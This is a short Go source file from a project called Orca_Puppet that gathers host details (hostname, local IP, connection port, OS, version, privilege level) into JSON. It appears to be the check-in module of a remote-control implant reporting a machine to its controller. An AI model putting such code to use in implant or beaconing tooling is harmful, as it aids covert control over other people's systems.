package listopt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/api"
	"Orca_Puppet/define/config"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"strings"
)

// 获取上线IP
func GetIP() (string, error) {
	conn, err := net.Dial("udp", api.HOST)
	if err != nil {
		return "", errors.New("IP fetch failed, detail:" + err.Error())
	}
	defer conn.Close()

	res := conn.LocalAddr().String()
	res = strings.Split(res, ":")[0]
	return res, nil
}

// 对结构体进行填充
func GetHostInfo() string {
	clientId := common.ClientId
	hostname := GetHostName()
	ip, _ := GetIP()
	connPort, _ := GetConnPort()
	os := GetOsName()
	version := fmt.Sprintf("%s:%s:%s", sysType, config.Version, sysArch)
	privilege := GetExecPrivilege()

	hostInfo := HostInfo{
		SystemId:  config.SystemId,
		ClientId:  clientId,
		Hostname:  hostname,
		Privilege: privilege,
		Ip:        ip,
		ConnPort:  connPort,
		Os:        os,
		Version:   version,
	}
	buf, _ := json.Marshal(hostInfo)
	return string(buf)
}
